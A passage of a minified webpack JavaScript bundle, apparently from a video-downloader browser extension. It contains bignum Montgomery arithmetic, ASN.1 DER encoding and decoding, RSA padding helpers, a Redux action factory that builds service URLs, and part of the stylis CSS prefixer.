                        var wnd = new Array(16);
                        (wnd[0] = new BN(1).toRed(this)), (wnd[1] = a);
                        for (var i = 2; i < wnd.length; i++) wnd[i] = this.mul(wnd[i - 1], a);
                        var res = wnd[0],
                            current = 0,
                            currentLen = 0,
                            start = num.bitLength() % 26;
                        for (0 === start && (start = 26), i = num.length - 1; i >= 0; i--) {
                            for (var word = num.words[i], j = start - 1; j >= 0; j--) {
                                var bit = (word >> j) & 1;
                                res !== wnd[0] && (res = this.sqr(res)),
                                    0 !== bit || 0 !== current ? ((current <<= 1), (current |= bit), (4 === ++currentLen || (0 === i && 0 === j)) && ((res = this.mul(res, wnd[current])), (currentLen = 0), (current = 0))) : (currentLen = 0);
                            }
                            start = 26;
                        }
                        return res;
                    }),
                    (Red.prototype.convertTo = function (num) {
                        var r = num.umod(this.m);
                        return r === num ? r.clone() : r;
                    }),
                    (Red.prototype.convertFrom = function (num) {
                        var res = num.clone();
                        return (res.red = null), res;
                    }),
                    (BN.mont = function (num) {
                        return new Mont(num);
                    }),
                    inherits(Mont, Red),
                    (Mont.prototype.convertTo = function (num) {
                        return this.imod(num.ushln(this.shift));
                    }),
                    (Mont.prototype.convertFrom = function (num) {
                        var r = this.imod(num.mul(this.rinv));
                        return (r.red = null), r;
                    }),
                    (Mont.prototype.imul = function (a, b) {
                        if (a.isZero() || b.isZero()) return (a.words[0] = 0), (a.length = 1), a;
                        var t = a.imul(b),
                            c = t.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),
                            u = t.isub(c).iushrn(this.shift),
                            res = u;
                        return u.cmp(this.m) >= 0 ? (res = u.isub(this.m)) : u.cmpn(0) < 0 && (res = u.iadd(this.m)), res._forceRed(this);
                    }),
                    (Mont.prototype.mul = function (a, b) {
                        if (a.isZero() || b.isZero()) return new BN(0)._forceRed(this);
                        var t = a.mul(b),
                            c = t.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),
                            u = t.isub(c).iushrn(this.shift),
                            res = u;
                        return u.cmp(this.m) >= 0 ? (res = u.isub(this.m)) : u.cmpn(0) < 0 && (res = u.iadd(this.m)), res._forceRed(this);
                    }),
                    (Mont.prototype.invm = function (a) {
                        return this.imod(a._invmp(this.m).mul(this.r2))._forceRed(this);
                    });
            })(module, this);
        }.call(this, __webpack_require__(23)(module)));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        const encoders = exports;
        (encoders.der = __webpack_require__(127)), (encoders.pem = __webpack_require__(273));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        const inherits = __webpack_require__(3),
            Buffer = __webpack_require__(62).Buffer,
            Node = __webpack_require__(63),
            der = __webpack_require__(65);
        function DEREncoder(entity) {
            (this.enc = "der"), (this.name = entity.name), (this.entity = entity), (this.tree = new DERNode()), this.tree._init(entity.body);
        }
        function DERNode(parent) {
            Node.call(this, "der", parent);
        }
        function two(num) {
            return num < 10 ? "0" + num : num;
        }
        (module.exports = DEREncoder),
            (DEREncoder.prototype.encode = function (data, reporter) {
                return this.tree._encode(data, reporter).join();
            }),
            inherits(DERNode, Node),
            (DERNode.prototype._encodeComposite = function (tag, primitive, cls, content) {
                const encodedTag = (function (tag, primitive, cls, reporter) {
                    let res;
                    "seqof" === tag ? (tag = "seq") : "setof" === tag && (tag = "set");
                    if (der.tagByName.hasOwnProperty(tag)) res = der.tagByName[tag];
                    else {
                        if ("number" != typeof tag || (0 | tag) !== tag) return reporter.error("Unknown tag: " + tag);
                        res = tag;
                    }
                    if (res >= 31) return reporter.error("Multi-octet tag encoding unsupported");
                    primitive || (res |= 32);
                    return (res |= der.tagClassByName[cls || "universal"] << 6), res;
                })(tag, primitive, cls, this.reporter);
                if (content.length < 128) {
                    const header = Buffer.alloc(2);
                    return (header[0] = encodedTag), (header[1] = content.length), this._createEncoderBuffer([header, content]);
                }
                let lenOctets = 1;
                for (let i = content.length; i >= 256; i >>= 8) lenOctets++;
                const header = Buffer.alloc(2 + lenOctets);
                (header[0] = encodedTag), (header[1] = 128 | lenOctets);
                for (let i = 1 + lenOctets, j = content.length; j > 0; i--, j >>= 8) header[i] = 255 & j;
                return this._createEncoderBuffer([header, content]);
            }),
            (DERNode.prototype._encodeStr = function (str, tag) {
                if ("bitstr" === tag) return this._createEncoderBuffer([0 | str.unused, str.data]);
                if ("bmpstr" === tag) {
                    const buf = Buffer.alloc(2 * str.length);
                    for (let i = 0; i < str.length; i++) buf.writeUInt16BE(str.charCodeAt(i), 2 * i);
                    return this._createEncoderBuffer(buf);
                }
                return "numstr" === tag
                    ? this._isNumstr(str)
                        ? this._createEncoderBuffer(str)
                        : this.reporter.error("Encoding of string type: numstr supports only digits and space")
                    : "printstr" === tag
                    ? this._isPrintstr(str)
                        ? this._createEncoderBuffer(str)
                        : this.reporter.error(
                              "Encoding of string type: printstr supports only latin upper and lower case letters, digits, space, apostrophe, left and rigth parenthesis, plus sign, comma, hyphen, dot, slash, colon, equal sign, question mark"
                          )
                    : /str$/.test(tag) || "objDesc" === tag
                    ? this._createEncoderBuffer(str)
                    : this.reporter.error("Encoding of string type: " + tag + " unsupported");
            }),
            (DERNode.prototype._encodeObjid = function (id, values, relative) {
                if ("string" == typeof id) {
                    if (!values) return this.reporter.error("string objid given, but no values map found");
                    if (!values.hasOwnProperty(id)) return this.reporter.error("objid not found in values map");
                    id = values[id].split(/[\s.]+/g);
                    for (let i = 0; i < id.length; i++) id[i] |= 0;
                } else if (Array.isArray(id)) {
                    id = id.slice();
                    for (let i = 0; i < id.length; i++) id[i] |= 0;
                }
                if (!Array.isArray(id)) return this.reporter.error("objid() should be either array or string, got: " + JSON.stringify(id));
                if (!relative) {
                    if (id[1] >= 40) return this.reporter.error("Second objid identifier OOB");
                    id.splice(0, 2, 40 * id[0] + id[1]);
                }
                let size = 0;
                for (let i = 0; i < id.length; i++) {
                    let ident = id[i];
                    for (size++; ident >= 128; ident >>= 7) size++;
                }
                const objid = Buffer.alloc(size);
                let offset = objid.length - 1;
                for (let i = id.length - 1; i >= 0; i--) {
                    let ident = id[i];
                    for (objid[offset--] = 127 & ident; (ident >>= 7) > 0; ) objid[offset--] = 128 | (127 & ident);
                }
                return this._createEncoderBuffer(objid);
            }),
            (DERNode.prototype._encodeTime = function (time, tag) {
                let str;
                const date = new Date(time);
                return (
                    "gentime" === tag
                        ? (str = [two(date.getUTCFullYear()), two(date.getUTCMonth() + 1), two(date.getUTCDate()), two(date.getUTCHours()), two(date.getUTCMinutes()), two(date.getUTCSeconds()), "Z"].join(""))
                        : "utctime" === tag
                        ? (str = [two(date.getUTCFullYear() % 100), two(date.getUTCMonth() + 1), two(date.getUTCDate()), two(date.getUTCHours()), two(date.getUTCMinutes()), two(date.getUTCSeconds()), "Z"].join(""))
                        : this.reporter.error("Encoding " + tag + " time is not supported yet"),
                    this._encodeStr(str, "octstr")
                );
            }),
            (DERNode.prototype._encodeNull = function () {
                return this._createEncoderBuffer("");
            }),
            (DERNode.prototype._encodeInt = function (num, values) {
                if ("string" == typeof num) {
                    if (!values) return this.reporter.error("String int or enum given, but no values map");
                    if (!values.hasOwnProperty(num)) return this.reporter.error("Values map doesn't contain: " + JSON.stringify(num));
                    num = values[num];
                }
                if ("number" != typeof num && !Buffer.isBuffer(num)) {
                    const numArray = num.toArray();
                    !num.sign && 128 & numArray[0] && numArray.unshift(0), (num = Buffer.from(numArray));
                }
                if (Buffer.isBuffer(num)) {
                    let size = num.length;
                    0 === num.length && size++;
                    const out = Buffer.alloc(size);
                    return num.copy(out), 0 === num.length && (out[0] = 0), this._createEncoderBuffer(out);
                }
                if (num < 128) return this._createEncoderBuffer(num);
                if (num < 256) return this._createEncoderBuffer([0, num]);
                let size = 1;
                for (let i = num; i >= 256; i >>= 8) size++;
                const out = new Array(size);
                for (let i = out.length - 1; i >= 0; i--) (out[i] = 255 & num), (num >>= 8);
                return 128 & out[0] && out.unshift(0), this._createEncoderBuffer(Buffer.from(out));
            }),
            (DERNode.prototype._encodeBool = function (value) {
                return this._createEncoderBuffer(value ? 255 : 0);
            }),
            (DERNode.prototype._use = function (entity, obj) {
                return "function" == typeof entity && (entity = entity(obj)), entity._getEncoder("der").tree;
            }),
            (DERNode.prototype._skipDefault = function (dataBuffer, reporter, parent) {
                const state = this._baseState;
                let i;
                if (null === state.default) return !1;
                const data = dataBuffer.join();
                if ((void 0 === state.defaultBuffer && (state.defaultBuffer = this._encodeValue(state.default, reporter, parent).join()), data.length !== state.defaultBuffer.length)) return !1;
                for (i = 0; i < data.length; i++) if (data[i] !== state.defaultBuffer[i]) return !1;
                return !0;
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        const decoders = exports;
        (decoders.der = __webpack_require__(129)), (decoders.pem = __webpack_require__(274));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        const inherits = __webpack_require__(3),
            bignum = __webpack_require__(125),
            DecoderBuffer = __webpack_require__(37).DecoderBuffer,
            Node = __webpack_require__(63),
            der = __webpack_require__(65);
        function DERDecoder(entity) {
            (this.enc = "der"), (this.name = entity.name), (this.entity = entity), (this.tree = new DERNode()), this.tree._init(entity.body);
        }
        function DERNode(parent) {
            Node.call(this, "der", parent);
        }
        function derDecodeTag(buf, fail) {
            let tag = buf.readUInt8(fail);
            if (buf.isError(tag)) return tag;
            const cls = der.tagClass[tag >> 6],
                primitive = 0 == (32 & tag);
            if (31 == (31 & tag)) {
                let oct = tag;
                for (tag = 0; 128 == (128 & oct); ) {
                    if (((oct = buf.readUInt8(fail)), buf.isError(oct))) return oct;
                    (tag <<= 7), (tag |= 127 & oct);
                }
            } else tag &= 31;
            return { cls: cls, primitive: primitive, tag: tag, tagStr: der.tag[tag] };
        }
        function derDecodeLen(buf, primitive, fail) {
            let len = buf.readUInt8(fail);
            if (buf.isError(len)) return len;
            if (!primitive && 128 === len) return null;
            if (0 == (128 & len)) return len;
            const num = 127 & len;
            if (num > 4) return buf.error("length octect is too long");
            len = 0;
            for (let i = 0; i < num; i++) {
                len <<= 8;
                const j = buf.readUInt8(fail);
                if (buf.isError(j)) return j;
                len |= j;
            }
            return len;
        }
        (module.exports = DERDecoder),
            (DERDecoder.prototype.decode = function (data, options) {
                return DecoderBuffer.isDecoderBuffer(data) || (data = new DecoderBuffer(data, options)), this.tree._decode(data, options);
            }),
            inherits(DERNode, Node),
            (DERNode.prototype._peekTag = function (buffer, tag, any) {
                if (buffer.isEmpty()) return !1;
                const state = buffer.save(),
                    decodedTag = derDecodeTag(buffer, 'Failed to peek tag: "' + tag + '"');
                return buffer.isError(decodedTag) ? decodedTag : (buffer.restore(state), decodedTag.tag === tag || decodedTag.tagStr === tag || decodedTag.tagStr + "of" === tag || any);
            }),
            (DERNode.prototype._decodeTag = function (buffer, tag, any) {
                const decodedTag = derDecodeTag(buffer, 'Failed to decode tag of "' + tag + '"');
                if (buffer.isError(decodedTag)) return decodedTag;
                let len = derDecodeLen(buffer, decodedTag.primitive, 'Failed to get length of "' + tag + '"');
                if (buffer.isError(len)) return len;
                if (!any && decodedTag.tag !== tag && decodedTag.tagStr !== tag && decodedTag.tagStr + "of" !== tag) return buffer.error('Failed to match tag: "' + tag + '"');
                if (decodedTag.primitive || null !== len) return buffer.skip(len, 'Failed to match body of: "' + tag + '"');
                const state = buffer.save(),
                    res = this._skipUntilEnd(buffer, 'Failed to skip indefinite length body: "' + this.tag + '"');
                return buffer.isError(res) ? res : ((len = buffer.offset - state.offset), buffer.restore(state), buffer.skip(len, 'Failed to match body of: "' + tag + '"'));
            }),
            (DERNode.prototype._skipUntilEnd = function (buffer, fail) {
                for (;;) {
                    const tag = derDecodeTag(buffer, fail);
                    if (buffer.isError(tag)) return tag;
                    const len = derDecodeLen(buffer, tag.primitive, fail);
                    if (buffer.isError(len)) return len;
                    let res;
                    if (((res = tag.primitive || null !== len ? buffer.skip(len) : this._skipUntilEnd(buffer, fail)), buffer.isError(res))) return res;
                    if ("end" === tag.tagStr) break;
                }
            }),
            (DERNode.prototype._decodeList = function (buffer, tag, decoder, options) {
                const result = [];
                for (; !buffer.isEmpty(); ) {
                    const possibleEnd = this._peekTag(buffer, "end");
                    if (buffer.isError(possibleEnd)) return possibleEnd;
                    const res = decoder.decode(buffer, "der", options);
                    if (buffer.isError(res) && possibleEnd) break;
                    result.push(res);
                }
                return result;
            }),
            (DERNode.prototype._decodeStr = function (buffer, tag) {
                if ("bitstr" === tag) {
                    const unused = buffer.readUInt8();
                    return buffer.isError(unused) ? unused : { unused: unused, data: buffer.raw() };
                }
                if ("bmpstr" === tag) {
                    const raw = buffer.raw();
                    if (raw.length % 2 == 1) return buffer.error("Decoding of string type: bmpstr length mismatch");
                    let str = "";
                    for (let i = 0; i < raw.length / 2; i++) str += String.fromCharCode(raw.readUInt16BE(2 * i));
                    return str;
                }
                if ("numstr" === tag) {
                    const numstr = buffer.raw().toString("ascii");
                    return this._isNumstr(numstr) ? numstr : buffer.error("Decoding of string type: numstr unsupported characters");
                }
                if ("octstr" === tag) return buffer.raw();
                if ("objDesc" === tag) return buffer.raw();
                if ("printstr" === tag) {
                    const printstr = buffer.raw().toString("ascii");
                    return this._isPrintstr(printstr) ? printstr : buffer.error("Decoding of string type: printstr unsupported characters");
                }
                return /str$/.test(tag) ? buffer.raw().toString() : buffer.error("Decoding of string type: " + tag + " unsupported");
            }),
            (DERNode.prototype._decodeObjid = function (buffer, values, relative) {
                let result;
                const identifiers = [];
                let ident = 0,
                    subident = 0;
                for (; !buffer.isEmpty(); ) (subident = buffer.readUInt8()), (ident <<= 7), (ident |= 127 & subident), 0 == (128 & subident) && (identifiers.push(ident), (ident = 0));
                128 & subident && identifiers.push(ident);
                const first = (identifiers[0] / 40) | 0,
                    second = identifiers[0] % 40;
                if (((result = relative ? identifiers : [first, second].concat(identifiers.slice(1))), values)) {
                    let tmp = values[result.join(" ")];
                    void 0 === tmp && (tmp = values[result.join(".")]), void 0 !== tmp && (result = tmp);
                }
                return result;
            }),
            (DERNode.prototype._decodeTime = function (buffer, tag) {
                const str = buffer.raw().toString();
                let year, mon, day, hour, min, sec;
                if ("gentime" === tag) (year = 0 | str.slice(0, 4)), (mon = 0 | str.slice(4, 6)), (day = 0 | str.slice(6, 8)), (hour = 0 | str.slice(8, 10)), (min = 0 | str.slice(10, 12)), (sec = 0 | str.slice(12, 14));
                else {
                    if ("utctime" !== tag) return buffer.error("Decoding " + tag + " time is not supported yet");
                    (year = 0 | str.slice(0, 2)),
                        (mon = 0 | str.slice(2, 4)),
                        (day = 0 | str.slice(4, 6)),
                        (hour = 0 | str.slice(6, 8)),
                        (min = 0 | str.slice(8, 10)),
                        (sec = 0 | str.slice(10, 12)),
                        (year = year < 70 ? 2e3 + year : 1900 + year);
                }
                return Date.UTC(year, mon - 1, day, hour, min, sec, 0);
            }),
            (DERNode.prototype._decodeNull = function () {
                return null;
            }),
            (DERNode.prototype._decodeBool = function (buffer) {
                const res = buffer.readUInt8();
                return buffer.isError(res) ? res : 0 !== res;
            }),
            (DERNode.prototype._decodeInt = function (buffer, values) {
                const raw = buffer.raw();
                let res = new bignum(raw);
                return values && (res = values[res.toString(10)] || res), res;
            }),
            (DERNode.prototype._use = function (entity, obj) {
                return "function" == typeof entity && (entity = entity(obj)), entity._getDecoder("der").tree;
            });
    },
    function (module) {
        module.exports = JSON.parse('{"1.3.132.0.10":"secp256k1","1.3.132.0.33":"p224","1.2.840.10045.3.1.1":"p192","1.2.840.10045.3.1.7":"p256","1.3.132.0.34":"p384","1.3.132.0.35":"p521"}');
    },
    function (module, exports, __webpack_require__) {
        var createHash = __webpack_require__(33),
            Buffer = __webpack_require__(5).Buffer;
        function i2ops(c) {
            var out = Buffer.allocUnsafe(4);
            return out.writeUInt32BE(c, 0), out;
        }
        module.exports = function (seed, len) {
            for (var c, t = Buffer.alloc(0), i = 0; t.length < len; ) (c = i2ops(i++)), (t = Buffer.concat([t, createHash("sha1").update(seed).update(c).digest()]));
            return t.slice(0, len);
        };
    },
    function (module, exports) {
        module.exports = function (a, b) {
            for (var len = a.length, i = -1; ++i < len; ) a[i] ^= b[i];
            return a;
        };
    },
    function (module, exports, __webpack_require__) {
        var BN = __webpack_require__(66),
            Buffer = __webpack_require__(5).Buffer;
        module.exports = function (paddedMsg, key) {
            return Buffer.from(paddedMsg.toRed(BN.mont(key.modulus)).redPow(new BN(key.publicExponent)).fromRed().toArray());
        };
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        module.exports = function () {
            throw new Error("ws does not work in the browser. Browser clients must use the native WebSocket object");
        };
    },
    function (module, __webpack_exports__, __webpack_require__) {
        "use strict";
        (function (Buffer) {
            var config__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(2),
                utils_add_utm__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(18),
                themes__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(136);
            const addFrom = () => {
                const { dist: dist } = config__WEBPACK_IMPORTED_MODULE_0__.a;
                return `from_${"userscript" === dist ? "usrscr" : "ext"}=1`;
            };
            __webpack_exports__.a = (store, actions) => {
                const dispatch = store.dispatch.bind(store),
                    { utm: utm } = store.getState();
                return {
                    getServiceUrl: (url, lang) =>
                        ((url, lang, utm) => {
                            const { serviceUrl: serviceUrl } = config__WEBPACK_IMPORTED_MODULE_0__.a;
                            if (serviceUrl) {
                                const modifiedBase64String = Buffer.from(url).toString("base64").replace("/", "_").replace("+", "-"),
                                    encodedString = encodeURIComponent(modifiedBase64String),
                                    urlWithoutUtm = serviceUrl.replace(/{%encodedString%}/g, encodedString).replace(/{%addFrom%}/g, addFrom());
                                return Object(utils_add_utm__WEBPACK_IMPORTED_MODULE_1__.a)(urlWithoutUtm, utm);
                            }
                            return null;
                        })(url, 0, utm),
                    getContactUsUrl: (lang) =>
                        ((lang, utm) => {
                            const { contactUsUrl: contactUsUrl } = config__WEBPACK_IMPORTED_MODULE_0__.a;
                            if (contactUsUrl) {
                                const contactUsUrlWithoutUtm = contactUsUrl.replace(/{%addFrom%}/g, addFrom());
                                return Object(utils_add_utm__WEBPACK_IMPORTED_MODULE_1__.a)(contactUsUrlWithoutUtm, utm);
                            }
                            return null;
                        })(0, utm),
                    setDir: (dir) => dispatch(actions.setDir(dir)),
                    setI18N: (i18n) => dispatch(actions.setI18N(i18n)),
                    setModule: (module) => dispatch(actions.setModule(module)),
                    setServiceName: (serviceName) => dispatch(actions.setServiceName(serviceName)),
                    setStatus: (status) => dispatch(actions.setStatus(status)),
                    setDownloadingMode: (mode) => dispatch(actions.setDownloadingMode(mode)),
                    setInfo: (info) => dispatch(actions.setInfo(info)),
                    setTitle: (title) => dispatch(actions.setTitle(title)),
                    setDefaultItem: (item) => dispatch(actions.setDefaultItem(item)),
                    setImgs: (imgs) => dispatch(actions.setImgs(imgs)),
                    setDisplayQrCodes: (value) => dispatch(actions.setDisplayQrCodes(value)),
                    setShowFormatsAvailableViaDesktopClient: (value) => dispatch(actions.setShowFormatsAvailableViaDesktopClient(value)),
                    setShowFormatsRequiredOnlineConversion: (value) => dispatch(actions.setShowFormatsRequiredOnlineConversion(value)),
                    setShowWebmVideos: (value) => dispatch(actions.setShowWebmVideos(value)),
                    setWarnBeforeConverting: (value) => dispatch(actions.setWarnBeforeConverting(value)),
                    setWarnAboutCompetitorsDetection: (value) => dispatch(actions.setWarnAboutCompetitorsDetection(value)),
                    setShowSnapshotButton: (value) => dispatch(actions.setShowSnapshotButton(value)),
                    setAppButtonStyle: (value) => dispatch(actions.setAppButtonStyle(value)),
                    setLang: (value) => dispatch(actions.setLang(value)),
                    setHelpState: (helpState) => dispatch(actions.setHelpState(helpState)),
                    addModal: (value) => dispatch(actions.addModal(value)),
                    removeModal: (value) => dispatch(actions.removeModal(value)),
                    setListMode: (value) => dispatch(actions.setListMode(value)),
                    setRatingModalLastCheck: (value) => dispatch(actions.setRatingModalLastCheck(value)),
                    setRatingModalNeverShow: (value) => dispatch(actions.setRatingModalNeverShow(value)),
                    setRatingModalLastNotNow: (value) => dispatch(actions.setRatingModalLastNotNow(value)),
                    incrementDownloads: () => dispatch(actions.incrementDownloads()),
                    incrementDownloadedInRow: () => dispatch(actions.incrementDownloadedInRow()),
                    resetDownloadedInRow: () => dispatch(actions.resetDownloadedInRow()),
                    incrementScreenshots: () => dispatch(actions.incrementScreenshots()),
                    setCancel: (cancel) => dispatch(actions.setCancel(cancel)),
                    setProgress: (progress) => dispatch(actions.setProgress(progress)),
                    resetProgress: () => dispatch(actions.resetProgress()),
                    setIsPreviousDownloading: (value) => dispatch(actions.setIsPreviousDownloading(value)),
                    setCurrentSpeed: (value) => dispatch(actions.setCurrentSpeed(value)),
                    setAverageSpeed: (value) => dispatch(actions.setAverageSpeed(value)),
                    setContentLength: (value) => dispatch(actions.setContentLength(value)),
                    setAlreadyDownloaded: (value) => dispatch(actions.setAlreadyDownloaded(value)),
                    setStats: (stats) => dispatch(actions.setStats(stats)),
                    setTheme: (theme) => {
                        const { settingsTheme: settingsTheme } = store.getState();
                        (settingsTheme && settingsTheme.name === theme) || store.dispatch(actions.setTheme({ name: theme, ...themes__WEBPACK_IMPORTED_MODULE_2__.a[theme] }));
                    },
                    setBodyScrollbarWidth: (value) => dispatch(actions.setBodyScrollbarWidth(value)),
                    setIsWebextDestroyed: (value) => dispatch(actions.setIsWebextDestroyed(value)),
                    setEventRouter: (value) => dispatch(actions.setEventRouter(value)),
                    addPublicId: (id) => dispatch(actions.addPublicId(id)),
                };
            };
        }.call(this, __webpack_require__(6).Buffer));
    },
    function (module, __webpack_exports__, __webpack_require__) {
        "use strict";
        const themes = { default: __webpack_require__(158), dark: __webpack_require__(159) };
        __webpack_exports__.a = themes;
    },
    function (module, __webpack_exports__, __webpack_require__) {
        "use strict";
        function symbolObservablePonyfill(root) {
            var result,
                Symbol = root.Symbol;
            return "function" == typeof Symbol ? (Symbol.observable ? (result = Symbol.observable) : ((result = Symbol("observable")), (Symbol.observable = result))) : (result = "@@observable"), result;
        }
        __webpack_require__.d(__webpack_exports__, "a", function () {
            return symbolObservablePonyfill;
        });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        module.exports = __webpack_require__(164);
    },
    function (module, exports) {
        module.exports = function (objA, objB, compare, compareContext) {
            var ret = compare ? compare.call(compareContext, objA, objB) : void 0;
            if (void 0 !== ret) return !!ret;
            if (objA === objB) return !0;
            if ("object" != typeof objA || !objA || "object" != typeof objB || !objB) return !1;
            var keysA = Object.keys(objA),
                keysB = Object.keys(objB);
            if (keysA.length !== keysB.length) return !1;
            for (var bHasOwnProperty = Object.prototype.hasOwnProperty.bind(objB), idx = 0; idx < keysA.length; idx++) {
                var key = keysA[idx];
                if (!bHasOwnProperty(key)) return !1;
                var valueA = objA[key],
                    valueB = objB[key];
                if (!1 === (ret = compare ? compare.call(compareContext, valueA, valueB, key) : void 0) || (void 0 === ret && valueA !== valueB)) return !1;
            }
            return !0;
        };
    },
    function (module, __webpack_exports__, __webpack_require__) {
        "use strict";
        __webpack_exports__.a = function (W) {
            function X(d, c, e) {
                var h = c.trim().split(ia);
                c = h;
                var a = h.length,
                    m = d.length;
                switch (m) {
                    case 0:
                    case 1:
                        var b = 0;
                        for (d = 0 === m ? "" : d[0] + " "; b < a; ++b) c[b] = Z(d, c[b], e).trim();
                        break;
                    default:
                        var v = (b = 0);
                        for (c = []; b < a; ++b) for (var n = 0; n < m; ++n) c[v++] = Z(d[n] + " ", h[b], e).trim();
                }
                return c;
            }
            function Z(d, c, e) {
                var h = c.charCodeAt(0);
                switch ((33 > h && (h = (c = c.trim()).charCodeAt(0)), h)) {
                    case 38:
                        return c.replace(F, "$1" + d.trim());
                    case 58:
                        return d.trim() + c.replace(F, "$1" + d.trim());
                    default:
                        if (0 < 1 * e && 0 < c.indexOf("\f")) return c.replace(F, (58 === d.charCodeAt(0) ? "" : "$1") + d.trim());
                }
                return d + c;
            }
            function P(d, c, e, h) {
                var a = d + ";",
                    m = 2 * c + 3 * e + 4 * h;
                if (944 === m) {
                    d = a.indexOf(":", 9) + 1;
                    var b = a.substring(d, a.length - 1).trim();
                    return (b = a.substring(0, d).trim() + b + ";"), 1 === w || (2 === w && L(b, 1)) ? "-webkit-" + b + b : b;
                }
                if (0 === w || (2 === w && !L(a, 1))) return a;
                switch (m) {
                    case 1015:
                        return 97 === a.charCodeAt(10) ? "-webkit-" + a + a : a;
                    case 951:
                        return 116 === a.charCodeAt(3) ? "-webkit-" + a + a : a;
                    case 963:
                        return 110 === a.charCodeAt(5) ? "-webkit-" + a + a : a;
                    case 1009:
                        if (100 !== a.charCodeAt(4)) break;
                    case 969:
                    case 942:
                        return "-webkit-" + a + a;
                    case 978:
                        return "-webkit-" + a + "-moz-" + a + a;
                    case 1019:
                    case 983:
                        return "-webkit-" + a + "-moz-" + a + "-ms-" + a + a;
                    case 883:
                        if (45 === a.charCodeAt(8)) return "-webkit-" + a + a;
                        if (0 < a.indexOf("image-set(", 11)) return a.replace(ja, "$1-webkit-$2") + a;
                        break;
                    case 932:
                        if (45 === a.charCodeAt(4))
                            switch (a.charCodeAt(5)) {
                                case 103:
                                    return "-webkit-box-" + a.replace("-grow", "") + "-webkit-" + a + "-ms-" + a.replace("grow", "positive") + a;
                                case 115:
                                    return "-webkit-" + a + "-ms-" + a.replace("shrink", "negative") + a;
                                case 98:
                                    return "-webkit-" + a + "-ms-" + a.replace("basis", "preferred-size") + a;
                            }
                        return "-webkit-" + a + "-ms-" + a + a;
                    case 964:
                        return "-webkit-" + a + "-ms-flex-" + a + a;
                    case 1023:
                        if (99 !== a.charCodeAt(8)) break;
                        return "-webkit-box-pack" + (b = a.substring(a.indexOf(":", 15)).replace("flex-", "").replace("space-between", "justify")) + "-webkit-" + a + "-ms-flex-pack" + b + a;
                    case 1005:
                        return ka.test(a) ? a.replace(aa, ":-webkit-") + a.replace(aa, ":-moz-") + a : a;
                    case 1e3:
                        switch (((c = (b = a.substring(13).trim()).indexOf("-") + 1), b.charCodeAt(0) + b.charCodeAt(c))) {
                            case 226:
                                b = a.replace(G, "tb");
                                break;
                            case 232:
                                b = a.replace(G, "tb-rl");
                                break;
                            case 220:
                                b = a.replace(G, "lr");
                                break;
                            default:
                                return a;
                        }
                        return "-webkit-" + a + "-ms-" + b + a;
                    case 1017:
                        if (-1 === a.indexOf("sticky", 9)) break;
                    case 975:
                        switch (((c = (a = d).length - 10), (m = (b = (33 === a.charCodeAt(c) ? a.substring(0, c) : a).substring(d.indexOf(":", 7) + 1).trim()).charCodeAt(0) + (0 | b.charCodeAt(7))))) {
                            case 203:
                                if (111 > b.charCodeAt(8)) break;
                            case 115:
                                a = a.replace(b, "-webkit-" + b) + ";" + a;
                                break;
                            case 207:
                            case 102:
                                a = a.replace(b, "-webkit-" + (102 < m ? "inline-" : "") + "box") + ";" + a.replace(b, "-webkit-" + b) + ";" + a.replace(b, "-ms-" + b + "box") + ";" + a;
                        }
                        return a + ";";
                    case 938:
                        if (45 === a.charCodeAt(5))
                            switch (a.charCodeAt(6)) {
                                case 105:
                                    return (b = a.replace("-items", "")), "-webkit-" + a + "-webkit-box-" + b + "-ms-flex-" + b + a;
                                case 115:
                                    return "-webkit-" + a + "-ms-flex-item-" + a.replace(ba, "") + a;
                                default:
                                    return "-webkit-" + a + "-ms-flex-line-pack" + a.replace("align-content", "").replace(ba, "") + a;
                            }
                        break;
                    case 973:
                    case 989:
                        if (45 !== a.charCodeAt(3) || 122 === a.charCodeAt(4)) break;
                    case 931:
                    case 953:
                        if (!0 === la.test(d))
                            return 115 === (b = d.substring(d.indexOf(":") + 1)).charCodeAt(0)
                                ? P(d.replace("stretch", "fill-available"), c, e, h).replace(":fill-available", ":stretch")
                                : a.replace(b, "-webkit-" + b) + a.replace(b, "-moz-" + b.replace("fill-", "")) + a;
                        break;
                    case 962:
                        if (((a = "-webkit-" + a + (102 === a.charCodeAt(5) ? "-ms-" + a : "") + a), 211 === e + h && 105 === a.charCodeAt(13) && 0 < a.indexOf("transform", 10)))
                            return a.substring(0, a.indexOf(";", 27) + 1).replace(ma, "$1-webkit-$2") + a;
                }
                return a;
            }
            function L(d, c) {
                var e = d.indexOf(1 === c ? ":" : "{"),
                    h = d.substring(0, 3 !== c ? e : 10);
                return (e = d.substring(e + 1, d.length - 1)), R(2 !== c ? h : h.replace(na, "$1"), e, c);
            }
            function ea(d, c) {
                var e = P(c, c.charCodeAt(0), c.charCodeAt(1), c.charCodeAt(2));
                return e !== c + ";" ? e.replace(oa, " or ($1)").substring(4) : "(" + c + ")";
            }
            function H(d, c, e, h, a, m, b, v, n, q) {
                for (var w, g = 0, x = c; g < A; ++g)
                    switch ((w = S[g].call(B, d, x, e, h, a, m, b, v, n, q))) {
                        case void 0:
                        case !1:
                        case !0:
                        case null:
                            break;
                        default:
                            x = w;
                    }
                if (x !== c) return x;
            }
            function U(d) {
                return void 0 !== (d = d.prefix) && ((R = null), d ? ("function" != typeof d ? (w = 1) : ((w = 2), (R = d))) : (w = 0)), U;
            }
            function B(d, c) {
                var e = d;
                if ((33 > e.charCodeAt(0) && (e = e.trim()), (e = [e]), 0 < A)) {
                    var h = H(-1, c, e, e, D, z, 0, 0, 0, 0);
                    void 0 !== h && "string" == typeof h && (c = h);
                }
                var a = (function M(d, c, e, h, a) {
                    for (var q, g, k, y, C, m = 0, b = 0, v = 0, n = 0, x = 0, K = 0, u = (k = q = 0), l = 0, r = 0, I = 0, t = 0, B = e.length, J = B - 1, f = "", p = "", F = "", G = ""; l < B; ) {
                        if (((g = e.charCodeAt(l)), l === J && 0 !== b + n + v + m && (0 !== b && (g = 47 === b ? 10 : 47), (n = v = m = 0), B++, J++), 0 === b + n + v + m)) {
                            if (l === J && (0 < r && (f = f.replace(N, "")), 0 < f.trim().length)) {
